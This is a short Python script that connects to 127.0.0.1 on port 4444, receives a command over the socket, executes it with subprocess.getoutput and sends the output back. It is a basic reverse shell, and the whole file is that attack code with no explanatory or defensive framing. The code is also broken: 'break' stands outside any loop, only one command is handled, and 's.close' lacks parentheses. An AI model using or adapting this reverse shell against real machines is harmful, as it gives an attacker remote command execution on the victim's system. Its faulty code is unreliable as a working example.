import socket
import subprocess

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4444))

command=s.recv(1024).decode()

if command=="exit":
    break

result=subprocess.getoutput(command)
s.send(result.encode())
s.close


